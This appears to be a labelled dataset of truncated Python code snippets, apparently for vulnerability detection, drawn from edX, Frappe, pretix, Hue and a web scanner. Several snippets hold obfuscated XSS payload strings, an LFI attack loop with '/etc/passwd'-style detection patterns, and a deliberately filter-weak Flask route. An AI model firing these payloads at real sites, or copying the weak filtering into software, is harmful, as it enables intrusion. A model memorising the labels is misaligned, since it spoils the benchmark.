url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P", "label": 0}, {"snippet_id": 20384, "code": "(Pa11yCrawler, self).__init__(*args, **kwargs) self.course_key=kwargs.get('course_key') if self.imports_dir: self.should_fetch_course=False else: self.should_fetch_course=kwargs.get('should_fetch_course", "label": 0}, {"snippet_id": 19923, "code": " / 'hars' self.a11y_file=Env.BOK_CHOY_A11Y_CUSTOM_RULES_FILE self.imports_dir=kwargs.get('imports_dir', None) self.coveragerc=kwargs.get('coveragerc', None) self.save_screenshots=kwargs.get('save_screenshots", "label": 0}, {"snippet_id": 26403, "code": " invoice. Please contact support to ' 'resolve this manually.')) else: self.instance.vat_id_validated=False class BaseInvoiceNameForm(BaseInvoiceAddressForm): def __init__(self, *args, **kwargs): super()", "label": 0}, {"snippet_id": 44807, "code": " script_path: script_path=script_path.replace('hdfs://', '') if request.fs.do_as_user(request.user, request.fs.exists, script_path): data=request.fs.do_as_user(request.user, request.fs.read, script_path, 0, 16", "label": 0}, {"snippet_id": 49864, "code": ") @app.route(\"/interact\", methods=[\"POST\"]) def vuln(): msg=request.form[\"message\"].replace('img', 'uwu').replace('location', 'owo').replace('script', 'uwu') responses=[ \"send help\", \"what is my purpose", "label": 1}, {"snippet_id": 50867, "code": " self.send_text(*args, **kwargs) def send_default(self, cmdname, *args, **kwargs): \"\"\" Data Evennia -> User. Args: cmdname(str): The first argument will always be the oob cmd name. *args(any): Remaining", "label": 0}, {"snippet_id": 43214, "code": " column_types_to_check_length: \t\t\t\tmax_length=cint(df.get(\"length\")) or cint(default_column_max_length) \t\t\t\tif len(cstr(value)) > max_length: \t\t\t\t\tif self.parentfield and self.idx: \t\t\t\t\t\treference=_(\"{0}, Row{1}\"", "label": 0}, {"snippet_id": 17970, "code": "'^submit_feedback$', 'util.views.submit_feedback'), ) for key, value in settings.MKTG_URL_LINK_MAP.items(): if value is None: continue if key==\"ROOT\" or key==\"COURSES\" or key==\"FAQ\": continue template=\"%s.html\" ", "label": 0}, {"snippet_id": 41514, "code": ".comments==1: \t\t\tpost.comment_text=_('1 comment') \t\telse: \t\t\tpost.comment_text=_('{0} comments').format(str(post.comments)) \t\tpost.avatar=post.avatar or \"\" \t\tpost.category=frappe.db.get_value('Blog Category", "label": 0}, {"snippet_id": 9553, "code": "/open_ended_notifications$', 'open_ended_grading.views.combined_notifications', name='open_ended_notifications'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$', 'open_ended_grading.views.peer_grading',", "label": 0}, {"snippet_id": 29714, "code": "(cmd) \tret=\"\" \tfor line in output: \t\tif \" \t\t\tcontinue \t\tif line !=\"\": \t\t\tback=json.dumps(line).split(\"\\\"\") \t\t\tif kwargs.get('ret'): \t\t\t\tret +=back[1] \t\t\t\tret +=\"<br />\" \t\t\telse: \t\t\t\tprint(back[1], end=\"", "label": 0}, {"snippet_id": 25156, "code": " django.contrib import messages from django.core.exceptions import ValidationError from django.utils.safestring import mark_safe from django.utils.translation import ugettext_lazy as _ from pretix.base", "label": 0}, {"snippet_id": 9447, "code": "), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$', 'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'), url", "label": 0}, {"snippet_id": 8959, "code": " urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$', 'courseware.views.jump_to', name=\"jump_to\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>", "label": 0}, {"snippet_id": 3426, "code": "(xss_request_url.headers) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers,", "label": 0}, {"snippet_id": 11954, "code": "(wiki_pattern())), url(r'^notify/', include(notify_pattern())), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/course_wiki/?$', 'course_wiki.views.course_wiki_redirect', name=\"course_wiki\"), url(r'^courses/(?", "label": 0}, {"snippet_id": 33831, "code": " Settings\", \"Blog Settings\").as_dict(no_default_fields=True)) \treturn list_context def get_children(): \treturn frappe.db.sql(\"\"\"select route as name, \t\ttitle from `tabBlog Category` \t\twhere published=1 ", "label": 0}, {"snippet_id": 5704, "code": " '\\'\"><y///oNMousEDown=((confirm))()>Click', '<a/href=javascript&colon;co\\u006efirm& '<img src=x onerror=confir\\u006d`1`>', '<svg/onload=co\\u006efir\\u006d`1`>', '<?xml version=\"1.0\"?><html><script xmlns", "label": 0}, {"snippet_id": 7575, "code": "/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=\"syllabus\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses", "label": 1}, {"snippet_id": 37485, "code": "\tlist_context.sub_title=_(\"Posts filed under{0}\").format(category_title) \t\tlist_context.title=category_title \telif frappe.local.form_dict.blogger: \t\tblogger=frappe.db.get_value(\"Blogger\",{\"name\": frappe.local", "label": 0}, {"snippet_id": 12145, "code": "/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/$', 'staticbook.views.index', name=\"book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/book/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.index", "label": 1}, {"snippet_id": 49734, "code": " \"Usage: python jShell.py IpAddress Port\\nExample: python jsHell.py 192.168.0.1 8080\" exit() PORT=sys.argv[2].strip() HOST=sys.argv[1].strip() print \"Listening on\",HOST+\":\"+PORT app=Flask(__name__) app", "label": 0}, {"snippet_id": 51375, "code": "', 'upload_date', 'filesize') search_fields=('internal_filename', 'orginal_filename', 'message') list_filter=['message', 'upload_date', 'user'][::-1] fields=('original_filename', 'internal_filename', 'message", "label": 1}, {"snippet_id": 27031, "code": "+furl if DEBUG==1: print \"Params: \" print params print hidden_param_name print hidden_param_value counter=0 for lfi in lfi_attacks: post_params={} counter+=1 parameters=\"\" for i in range(0,len(params)):", "label": 0}, {"snippet_id": 44698, "code": ".username, 'value': workflow.uuid, 'id': workflow.id } for workflow in[d.content_object for d in Document.objects.get_docs(user, Document2, extra='workflow2')] ] def add_node(request): response={'status'", "label": 0}, {"snippet_id": 14555, "code": " BuildFailure from pavelib.utils.test.suites import BokChoyTestSuite, Pa11yCrawler REPO_DIR=os.getcwd() class TestPaverBokChoyCmd(unittest.TestCase): \"\"\" Paver Bok Choy Command test cases \"\"\" def _expected_command", "label": 1}, {"snippet_id": 21797, "code": " urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$', 'courseware.views.submission_history', name='submission_history'), )", "label": 0}, {"snippet_id": 49194, "code": " self.query_order.split('.'): c=column.replace(\"-\", \"\") if not int(c)==self.column_id: new_query.append(column) return self.get_url_with_query_params({ self.ordering_query_param: \".\".join(new_query) }) def", "label": 0}, {"snippet_id": 43916, "code": " cast_fieldtype(df.fieldtype, value) \tdef _extract_images_from_text_editor(self): \t\tfrom frappe.utils.file_manager import extract_images_from_doc \t\tif self.doctype !=\"DocType\": \t\t\tfor df in self.meta.get(\"fields\",{", "label": 0}, {"snippet_id": 36611, "code": " get_comment_list class BlogPost(WebsiteGenerator): \twebsite=frappe._dict( \t\torder_by=\"published_on desc\" \t) \tdef make_route(self): \t\tif not self.route: \t\t\treturn frappe.db.get_value('Blog Category', self", "label": 0}, {"snippet_id": 31336, "code": ") \t\tdf=pd.DataFrame.from_dict(metrics, orient=\"index\") \t\tdf=df.fillna(0) \t\tdf.index=pd.to_datetime(df.index) \t\tdf.index.name='Date' \t\tdf.sort_index(inplace=True) \t\tsource=ColumnDataSource(df) \t\t \t\toutput_file", "label": 0}, {"snippet_id": 19385, "code": "._expected_command(name=test_dir) ) def test_verbosity_settings_1_process(self): \"\"\" Using 1 process means paver should ask for the traditional xunit plugin for plugin results \"\"\" expected_verbosity_string=", "label": 0}, {"snippet_id": 3943, "code": ".api_request(url, \"GET\", temp_headers) decoded_payload=xss_payload_decode(payload) if ref_header_xss.text.find(decoded_payload) !=-1: print ref_header_xss.text impact=check_xss_impact(temp_headers) print \"", "label": 0}, {"snippet_id": 25690, "code": ".CheckboxInput() if initial: initialbool=(initial.answer==\"True\") else: initialbool=False field=forms.BooleanField( label=q.question, required=q.required, help_text=help_text, initial=initialbool, widget=widget, )", "label": 1}, {"snippet_id": 47140, "code": " is None: return True record=Record(model.json, model=model) record.delete() db.session.commit() except SQLAlchemyError as e: if not self.handle_view_exception(e): flash(_('Failed to delete record. %(error", "label": 0}, {"snippet_id": 30582, "code": " \telse: \t\tcmd=\"cat %s| awk '$4>\\\"%s:00\\\" && $4<\\\"%s:00\\\"' |tail -%s %s %s\" %(apache_log_path+\"/\"+serv, date, date1, rows, grep_act, grep) \toutput, stderr=funct.subprocess_execute(cmd) \tfunct.show_log(output", "label": 0}, {"snippet_id": 19871, "code": ".xunit_report=self.report_dir / \"xunit.xml\" self.cache=Env.BOK_CHOY_CACHE self.fasttest=kwargs.get('fasttest', False) self.serversonly=kwargs.get('serversonly', False) self.testsonly=kwargs.get('testsonly', False", "label": 0}, {"snippet_id": 28664, "code": "\t\tsql.update_last_act_user(user_uuid.value) \t\tif sql.get_user_name_by_uuid(user_uuid.value) is None: \t\t\tprint('<meta http-equiv=\"refresh\" content=\"0; url=login.py?ref=%s\">' % ref) \telse: \t\tprint('<meta", "label": 0}, {"snippet_id": 31318, "code": "]=str(i[1]) \t\t\tmetrics[rep_date]['curr_ssl_con']=str(i[2]) \t\t\tmetrics[rep_date]['sess_rate']=str(i[3]) \t\t\tmetrics[rep_date]['max_sess_rate']=str(i[4]) \t\tdf=pd.DataFrame.from_dict(metrics, orient=\"index", "label": 0}, {"snippet_id": 27880, "code": " logging.exception(exception) if helpers.should_render_json( self.request.headers.get('accept', ''), self.response.headers.get('Content-Type')): self.render_json(values, 500) else: self.render('error.html'", "label": 0}, {"snippet_id": 18106, "code": ", url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch", "label": 0}, {"snippet_id": 19322, "code": ".assertEqual( suite.cmd, self._expected_command(name=name, store='invalid') ) def test_serversonly(self): suite=BokChoyTestSuite('', serversonly=True) self.assertEqual(suite.cmd, \"\") def test_verify_xss(self)", "label": 0}, {"snippet_id": 39161, "code": "\"DocType\", \"DocField\", \"DocPerm\"): \t\t\t\tfrom frappe.model.meta import get_table_columns \t\t\t\tvalid=get_table_columns(self.doctype) \t\t\telse: \t\t\t\tvalid=self.meta.get_valid_columns() \t\t\tfrappe.local.valid_columns", "label": 0}, {"snippet_id": 23637, "code": "*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings.STATIC_URL, document_root=settings.STATIC_ROOT) handler404='static_template_view.views.render_404' handler500='static_template_view.views.render_500", "label": 0}, {"snippet_id": 46170, "code": "(request.user, engine).datasets() if not collections: return no_collections(request) collection=Collection2(user=request.user, name=collections[0], engine=engine) query={'qs':[{'q': ''}], 'fqs':[], 'start", "label": 0}, {"snippet_id": 792, "code": ", \"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) result,db_update=True,True vul_param +=key else: result=True if vul_param=='': vul_param +=key else", "label": 0}, {"snippet_id": 35316, "code": ": \t\t\t\tif not self.get(fieldname): \t\t\t\t\tmissing.append((fieldname, get_msg(frappe._dict(label=fieldname)))) \t\treturn missing \tdef get_invalid_links(self, is_submittable=False): \t\t'''Returns list of invalid", "label": 0}, {"snippet_id": 31933, "code": "(os.getcwd())+\"/\"+sql.get_setting('lists_path')+\"/\"+form.getvalue('group')+\"/\"+form.getvalue('color') \tlists=funct.get_files(dir=list, format=\"lst\") \tfor list in lists: \t\tprint(list) \t\t if form.getvalue", "label": 0}, {"snippet_id": 12362, "code": "\"student_progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/instructor$', 'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)", "label": 0}, {"snippet_id": 2491, "code": ".unquote(payload).decode('utf8').encode('ascii','ignore') return decoded_payload def xss_post_method(url,method,headers,body,scanid=None): print url, headers,method,body temp_body={} post_vul_param='' for", "label": 0}, {"snippet_id": 53619, "code": "'coordinators']])]) for i, bundled in enumerate(bundle.data['coordinators']): coord=coords[bundled['coordinator']] workflow=Workflow(document=coord.dependencies.all()[0]) wf_dir=Submission(request.user, workflow", "label": 0}, {"snippet_id": 312, "code": "/json' or 'text/plain'in xss_request['Content-Type']: impact=\"Low\" else: impact=\"High\" else: impact=\"Low\" return impact def xss_get_method(url,method,headers,body,scanid=None): result='' url_query=urlparse", "label": 1}, {"snippet_id": 4948, "code": "=l oNerrOr=(confirm)() x>', '<svg/x=\">\"/onload=confirm()//', '<svg%0Aonload=%09((pro\\u006dpt))()//', '<iMg sRc=x:confirm`` oNlOad=e\\u0076al(src)>', '<sCript x>confirm``</scRipt x>', '<Script x>prompt()<", "label": 0}, {"snippet_id": 15705, "code": " servers running. Press Ctrl-C to exit...\\n' print 'Note: pressing Ctrl-C multiple times can corrupt noseid files and system state. Just press it once.\\n' while True: try: sleep(10000) except KeyboardInterrupt", "label": 0}, {"snippet_id": 9943, "code": " +=( url(r'^debug/run_python', 'debug.views.run_python'), ) if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$", "label": 0}, {"snippet_id": 32358, "code": "(top_level, 'docs', 'README.md')): print(' Try loading %s/docs/README.md' % origin) elif os.path.isfile(os.path.join(args.directory, 'README.md')): print(' Try loading %s/README.md' % origin) retcode=1", "label": 0}, {"snippet_id": 2604, "code": " temp_headers={} temp_headers.update(headers) xss_payloads=fetch_xss_payload() for payload in xss_payloads: parse_domain=urlparse.urlparse(url).netloc host_header={\"Host\": parse_domain +'/' +payload} headers", "label": 0}, {"snippet_id": 27321, "code": " import logging import os import re import sys import traceback import urllib.parse import jinja2 import webapp2 from base import utils from config import db_config from config import local_config from", "label": 0}, {"snippet_id": 22025, "code": "'^event_logs$', 'track.views.view_tracking_log'), url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log'), ) if settings.MITX_FEATURES.get('ENABLE_SERVICE_STATUS'): urlpatterns +=( url(r'^status/", "label": 0}, {"snippet_id": 26845, "code": "', '/fastdetect', 'root:x:0:0', ':/root:/bin'] def check_xss(host, page, method, params, hidden_param_name, hidden_param_value, form_counter, _url): global xss_attacks global DEBUG if page.find(\"http:/", "label": 0}, {"snippet_id": 555, "code": " return payload_list def check_xss_impact(res_headers): if res_headers['Content-Type']: if 'application/json' or 'text/plain' in xss_request['Content-Type']: impact=\"Low\" else: impact=\"High\" else: impact", "label": 1}, {"snippet_id": 10597, "code": " import Env from pavelib.utils.test import bokchoy_utils from pavelib.utils.test import utils as test_utils import os try: from pygments.console import colorize except ImportError: colorize=lambda color,", "label": 0}, {"snippet_id": 13536, "code": ".*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.modx_dispatch', name='modx_dispatch'), url(r'^software-licenses$', 'licenses.views.user_software_license', name=\"user_software_license\"), url(r'^courses", "label": 0}, {"snippet_id": 28803, "code": " \tfor server in servers: \t\tssh_port=server[10] \tssh=SSHClient() \tssh.load_system_host_keys() \tssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) \ttry: \t\tif ssh_enable==1: \t\t\tk=paramiko.RSAKey.from_private_key_file", "label": 0}, {"snippet_id": 14315, "code": "<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_register', name='course-specific-register'), ) if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'): urlpatterns +=( url(r'^openid", "label": 0}, {"snippet_id": 462, "code": "(\"%s is vulnerable to XSS\",url) if xss_request_url.text.find(payload) !=-1 or xss_request_uri.text.find(payload) !=-1: impact=check_xss_impact(xss_request_url.headers) print \"%s[{0}]{1} is vulnerable to", "label": 1}, {"snippet_id": 27684, "code": "'ga_tracking_id']=( local_config.GAEConfig().get('ga_tracking_id') if not auth.is_current_user_admin() else None) if values['is_logged_in']: values['switch_account_url']=make_login_url(self.request.url)", "label": 0}, {"snippet_id": 50235, "code": "[csessid].finish() del self.requests[csessid] if csessid in self.databuffer: del self.databuffer[csessid] def mode_init(self, request): \"\"\" This is called by render_POST when the client requests an init mode", "label": 0}, {"snippet_id": 18129, "code": "'xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r'^calculate$', 'util.views.calculate'), url(r'^courses/?$', 'branding.views.courses', name=\"courses\"), url(r", "label": 0}, {"snippet_id": 54694, "code": "'markdown.extensions.extra', 'markdown.extensions.codehilite', 'markdown.extensions.toc', ]) return context def post(self, request, *args, **kwargs): self.object=self.get_object() form=self.get_form() if", "label": 0}, {"snippet_id": 46906, "code": "): obj=await Comment.create(github_id=user_id, post_id=self.id, ref_id=ref_id) redis=await create_pool(RedisSettings.from_url(REDIS_URL)) await asyncio.gather( obj.set_content(content), redis.enqueue_job", "label": 0}, {"snippet_id": 31326, "code": "[rep_date]['sess_rate']=str(i[3]) \t\t\tmetrics[rep_date]['max_sess_rate']=str(i[4]) \t\tdf=pd.DataFrame.from_dict(metrics, orient=\"index\") \t\tdf=df.fillna(0) \t\tdf.index=pd.to_datetime(df.index) \t\tdf.index.name", "label": 0}, {"snippet_id": 39305, "code": "\tset_new_name(self) \t\tif not self.creation: \t\t\tself.creation=self.modified=now() \t\t\tself.created_by=self.modifield_by=frappe.session.user \t\td=self.get_valid_dict(convert_dates_to_str=True) \t\tcolumns=list(d) \t\ttry:", "label": 0}, {"snippet_id": 34124, "code": ".utils.link_count import notify_link_count from frappe.modules import load_doctype_module from frappe.model import display_fieldtypes from frappe.model.db_schema import type_map, varchar_len from frappe", "label": 0}, {"snippet_id": 13334, "code": ".MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view.views.render', {'template': 'jobs.html'}, name=\"jobs\"), url(r'^press$', 'student.views.press', name=\"press\"), url", "label": 0}, {"snippet_id": 54083, "code": ")==\"POST\": get=False post=True else: get=True post=True fresh=False if refresh.get()==\"On\": fresh=True ck=None c=cookie.get() if len(c)>0: ck=c for x in crl: if stop==True: break print(\"[*]URL:{}\".format", "label": 0}, {"snippet_id": 13606, "code": "/about$', 'courseware.views.course_about', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^mktg", "label": 0}, {"snippet_id": 35596, "code": "(df.fieldname, cstr(self.get(df.fieldname)).strip()) \t\t\tvalue=self.get(df.fieldname) \t\t\tif value not in options and not(frappe.flags.in_test and value.startswith(\"_T-\")): \t\t\t\t \t\t\t\tprefix=_(\"Row \t\t\t\tlabel", "label": 0}, {"snippet_id": 12942, "code": ") if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'): urlpatterns +=( url(r'^edinsights_service/', include('edinsights.core.urls')), ) import edinsights.core.registry urlpatterns +=( url(r", "label": 0}, {"snippet_id": 26122, "code": "-display-dependency'] if 'vat_id' in self.fields: del self.fields['vat_id'].widget.attrs['data-display-dependency'] self.fields['name_parts']=NamePartsFormField( max_length=255, required=event.settings", "label": 0}, {"snippet_id": 22717, "code": ">[^/]+/[^/]+/[^/]+)/about$', 'courseware.views.course_about', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views.mktg_course_about', name=\"mktg_about_course", "label": 0}, {"snippet_id": 46968, "code": " orderings=['-id']) @property @cache(MC_KEY_N_COMMENTS %('{self.id}')) async def n_comments(self): return await Comment.filter(post_id=self.id).count() @cache(MC_KEY_COMMNET_IDS_LIKED_BY_USER %( '{user_id", "label": 0}, {"snippet_id": 21999, "code": "<reload_dir>[^/]+)/(?P<commit_id>[^/]+)$', 'lms_migration.migrate.manage_modulestores'), url(r'^gitreload$', 'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate", "label": 0}, {"snippet_id": 15656, "code": " import_dir=self.imports_dir ) ) def load_data(self): \"\"\" Loads data into database from db_fixtures \"\"\" print 'Loading data from json fixtures in db_fixtures directory' sh( \"DEFAULT_STORE={default_store", "label": 0}, {"snippet_id": 46291, "code": "='search.mako' if is_mobile: template='search_m.mako' return render(template, request,{ 'collection': collection, 'query': query, 'initial': json.dumps({ 'autoLoad': True, 'collections': collections, 'layout", "label": 0}, {"snippet_id": 4761, "code": "'ontimeupdate', 'ontoggle', 'ontouchcancel', 'ontouchend', 'ontouchmove', 'ontouchstart', 'ontransitionend', 'onunload', 'onvolumechange', 'onwaiting', 'onwebkitanimationend', 'onwebkitanimationiteration', ", "label": 0}, {"snippet_id": 39862, "code": " docname) \t\t\t\t\tif not values.name: \t\t\t\t\t\tinvalid_links.append((df.fieldname, docname, get_msg(df, docname))) \t\t\t\t\telif(df.fieldname !=\"amended_from\" \t\t\t\t\t\tand(is_submittable or self.meta.is_submittable", "label": 0}, {"snippet_id": 37973, "code": ", self.blogger).as_dict() \t\tcontext.description=self.blog_intro or self.content[:140] \t\tcontext.metatags={ \t\t\t\"name\": self.title, \t\t\t\"description\": context.description, \t\t} \t\tif \"<!--markdown -->\" in context", "label": 0}, {"snippet_id": 33923, "code": "(filters.blogger)) \t\tif filters.blog_category: \t\t\tconditions.append('t1.blog_category=\"%s\"' % frappe.db.escape(filters.blog_category)) \tif txt: \t\tconditions.append('(t1.content like \"%{0}%\" or t1.title like", "label": 0}, {"snippet_id": 1690, "code": " data['res_body'], 'Description': data['Description'], 'remediation': data['remediation']} vul_list.append(all_data) if data['id']: for vul in alerts: if data['id']==vul['id']: all_data={ 'url': data['url'", "label": 0}, {"snippet_id": 51833, "code": "'formatter': 'color', }, }, 'formatters':{ 'debug':{ 'format': '%(asctime)s\\t%(levelname)-8s -%(filename)-20s:%(lineno)-4s -' '%(funcName)20s() -%(message)s', }, 'color':{ '()': 'colorlog.ColoredFormatter',", "label": 0}, {"snippet_id": 39020, "code": " \t\t\t\t\telif(not isinstance(d[fieldname], int) or d[fieldname] > 1): \t\t\t\t\t\td[fieldname]=1 if cint(d[fieldname]) else 0 \t\t\t\telif df.fieldtype==\"Int\" and not isinstance(d[fieldname], int): \t\t\t\t\td[fieldname", "label": 0}, {"snippet_id": 17533, "code": ".run_python'), ) if settings.MITX_FEATURES.get('ENABLE_HINTER_INSTRUCTOR_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/hint_manager$', 'instructor.hint_manager.hint_manager', name", "label": 0}, {"snippet_id": 23011, "code": "/instructor$', 'instructor.views.instructor_dashboard', name=\"instructor_dashboard\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/gradebook$', 'instructor.views.gradebook', name='gradebook'), url(r'^courses/", "label": 0}, {"snippet_id": 33387, "code": "/internal/cron/buildbucket/bq-export-experimental', bq.CronExportBuildsExperimental), webapp2.Route(r'/internal/cron/buildbucket/unregister-builders', UnregisterBuilders), webapp2.Route(r'/internal/task", "label": 0}, {"snippet_id": 21497, "code": "'instructor.views.gradebook', name='gradebook'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary'), url(r'^courses/(?P<course_id>[^/", "label": 0}, {"snippet_id": 15585, "code": "() bokchoy_utils.clear_mongo() self.cache.flush_all() self.load_data() self.load_courses() msg=colorize('green', \"Confirming servers are running...\") print msg bokchoy_utils.start_servers(self.default_store", "label": 0}, {"snippet_id": 30407, "code": " \trows=form.getvalue('rows') \twaf=form.getvalue('waf') \tgrep=form.getvalue('grep') \thour=form.getvalue('hour') \tminut=form.getvalue('minut') \thour1=form.getvalue('hour1') \tminut1=form.getvalue('minut1'", "label": 0}, {"snippet_id": 10380, "code": ", validate that num_processes can be set to various values \"\"\" process_count=3 expected_verbosity_string=( \"--with-xunitmp --xunitmp-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml\" \" --processes", "label": 0}, {"snippet_id": 42159, "code": "\"Percent\") and not isinstance(d[fieldname], float): \t\t\t\t\td[fieldname]=flt(d[fieldname]) \t\t\t\telif df.fieldtype in(\"Datetime\", \"Date\", \"Time\") and d[fieldname]==\"\": \t\t\t\t\td[fieldname]=None \t\t\t\telif df.get", "label": 0}, {"snippet_id": 24854, "code": " method composes the nosetests command to send to the terminal. If nosetests aren't being run, the command returns an empty string. \"\"\" if not self.test_spec: test_spec=self.test_dir else: test_spec=self", "label": 0}, {"snippet_id": 6875, "code": "\" Add a default eduPersonScopedAffiliation if none is returned from the attribute manager. \"\"\" return self.config.get(self.section, 'default_scoped_affiliation') @property def vccs_url(self): \"\"\" URL to", "label": 0}, {"snippet_id": 25735, "code": "==Question.TYPE_STRING: field=forms.CharField( label=q.question, required=q.required, help_text=help_text, initial=initial.answer if initial else None, ) elif q.type==Question.TYPE_TEXT: field=forms.CharField", "label": 0}, {"snippet_id": 8386, "code": " settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'): urlpatterns +=( url(r'^edinsights_service/', include('edinsights.core.urls')), ) import edinsights.core.registry urlpatterns +=( url(r'^comm", "label": 0}, {"snippet_id": 38871, "code": " attached to child table of \"{1}\" must be a dict or BaseDocument, not{2}({3})'.format(key, \t\t\t\t\tself.name, str(type(value))[1:-1], value) \t\t\t) \tdef extend(self, key, value): \t\tif isinstance(value, list): ", "label": 0}, {"snippet_id": 53258, "code": " _submit_coordinator(request, coordinator, mapping): try: wf_doc=Document2.objects.get(uuid=coordinator.data['properties']['workflow']) wf_dir=Submission(request.user, Workflow(document=wf_doc), request", "label": 0}, {"snippet_id": 13815, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>[^/]*)/$', 'courseware.views.index', name=\"courseware_chapter\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware/(?P<chapter>", "label": 0}, {"snippet_id": 9520, "code": "(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$', 'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts", "label": 0}, {"snippet_id": 14615, "code": "\" \"--with-xunit \" \"--xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml \" \"--verbosity=2 \" ).format( default_store=store, repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else ", "label": 0}, {"snippet_id": 6667, "code": "=self.config.get(self.section, 'status_test_usernames') res=[x.strip() for x in value.split(',')] self._parsed_status_test_usernames=res return res @property def signup_link(self): \"\"\" URL(string) for use", "label": 0}, {"snippet_id": 18693, "code": "/notes$', 'notes.views.notes', name='notes'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/notes/', include('notes.urls')), ) if settings.MITX_FEATURES.get('ENABLE_MASQUERADE'): urlpatterns +=( url(r", "label": 0}, {"snippet_id": 36767, "code": "\"image\"]=image \t\tcontext.comment_list=get_comment_list(self.doctype, self.name) \t\tif not context.comment_list: \t\t\tcontext.comment_text=_('No comments yet') \t\telse: \t\t\tif(len(context.comment_list))==1: ", "label": 0}, {"snippet_id": 44459, "code": "-workflow2', id=job['id']) name=doc2.name +'-copy' copy_doc=doc2.doc.get().copy(name=name, owner=request.user) doc2.pk=None doc2.id=None doc2.uuid=str(uuid.uuid4()) doc2.name=name doc2.owner=request.user", "label": 0}, {"snippet_id": 18882, "code": "-register'), ) if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'): urlpatterns +=( url(r'^openid/provider/login/$', 'external_auth.views.provider_login', name='openid-provider-login'), url(r'^openid", "label": 0}, {"snippet_id": 8737, "code": "=\"static_university_profile\", kwargs={'org_id': 'ANUx'}), url(r'^(?i)university_profile/EPFLx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'EPFLx", "label": 0}, {"snippet_id": 43343, "code": ". \t\t\t-Ignore if 'Ignore XSS Filter' is checked or fieldtype is 'Code' \t\t\"\"\" \t\tif frappe.flags.in_install: \t\t\treturn \t\tfor fieldname, value in self.get_valid_dict().items(): \t\t\tif not value or not isinstance", "label": 0}, {"snippet_id": 3381, "code": ", '%3F', '%26', '%3D'] for uri_list in uri_check_list: if uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url==", "label": 0}, {"snippet_id": 35391, "code": " set for link field{0}\").format(df.fieldname)) \t\t\t\telse: \t\t\t\t\tdoctype=self.get(df.options) \t\t\t\t\tif not doctype: \t\t\t\t\t\tfrappe.throw(_(\"{0} must be set first\").format(self.meta.get_label(df.options))) \t\t\t\t", "label": 0}, {"snippet_id": 13242, "code": ", 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}), url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile'", "label": 0}, {"snippet_id": 16561, "code": ".*?)/(?P<dispatch>[^/]*)$', 